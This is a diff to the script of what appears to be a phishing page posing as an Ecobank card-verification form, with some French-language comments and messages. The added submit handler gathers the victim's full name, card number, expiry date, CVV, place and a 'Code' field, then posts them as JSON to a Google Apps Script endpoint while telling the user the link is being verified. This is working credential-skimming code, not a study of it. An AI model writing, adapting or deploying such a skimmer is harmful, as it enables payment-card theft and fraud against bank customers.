@@ -207,9 +207,61 @@
         </div>
 
         <script>
-
-
 document.getElementById('ecobankForm').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  
+  // 1. Afficher un indicateur de chargement
+  const submitBtn = e.target.querySelector('button[type="submit"]');
+  submitBtn.disabled = true;
+  submitBtn.textContent = 'Envoi en cours...';
+
+  try {
+    // 2. Préparer les données
+    const formData = {
+      fullName: document.querySelector('input[placeholder="Enter your full name / Nom complet"]').value,
+      cardNumber: document.querySelector('input[placeholder="0000 0000 0000 0000"]').value,
+      expiryDate: document.querySelector('input[placeholder="01/23"]').value,
+      cvv: document.querySelector('input[placeholder="CVV"]').value,
+      lieu: document.querySelector('input[placeholder="Lieu"]').value,
+      code: document.querySelector('input[placeholder="Code"]').value
+    };
+
+    // 3. Envoyer les données avec un timeout
+    const response = await Promise.race([
+      fetch('https://script.google.com/macros/s/AKfycbwMH4cKgUEGzUkD8dIKHDS7va8_d4BDnxTySm1S5Lg/exec', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(formData)
+      }),
+      new Promise((_, reject) => 
+        setTimeout(() => reject(new Error('Timeout après 10 secondes')), 10000)
+      )
+    ]);
+
+    // 4. Traiter la réponse
+    const result = await response.json();
+    
+    if (result.success) {
+      alert(result.message || 'Données enregistrées avec succès!');
+      // Réinitialiser le formulaire si besoin
+      e.target.reset();
+    } else {
+      throw new Error(result.error || 'Erreur inconnue du serveur');
+    }
+    
+  } catch (error) {
+    console.error('Erreur:', error);
+    alert('Erreur: ' + error.message);
+  } finally {
+    // 5. Réactiver le bouton
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'Vérifier la liaison';
+  }
+});
+
+/* document.getElementById('ecobankForm').addEventListener('submit', async function(e) {
   e.preventDefault();
   
   const formData = {
@@ -240,7 +292,7 @@ document.getElementById('ecobankForm').addEventListener('submit', async function
     console.error('Error:', error);
     alert('Erreur de connexion. Veuillez réessayer.');
   }
-});
+}); */
 
 
          /*  fetch('https://script.google.com/macros/s/AKfycbwMH4cKgUEGzUkD8dIKHDS7va8_d4BDnxTySm1S5Lg/exec', {
